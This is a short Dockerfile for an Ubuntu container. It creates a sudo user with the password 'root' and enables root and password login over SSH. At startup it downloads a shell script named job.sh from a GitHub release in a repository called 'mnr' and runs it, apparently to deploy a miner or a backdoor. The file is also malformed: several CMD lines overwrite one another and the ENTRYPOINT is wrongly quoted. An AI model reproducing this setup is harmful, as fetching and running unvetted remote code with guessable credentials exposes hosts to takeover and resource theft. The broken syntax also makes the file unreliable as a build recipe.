FROM ubuntu:xenial-20180112.1
USER root
RUN apt-get update && apt-get install ssh make gcc htop -y
CMD adduser --disabled-password --gecos "" panda
CMD adduser panda sudo && echo 'panda:root' | chpasswd
CMD echo 'Port 22' >> /etc/ssh/sshd_config && echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config && echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config && service ssh restart
ENTRYPOINT "wget https://github.com/p4n1k/mnr/releases/download/sleep/job.sh && job.sh run"
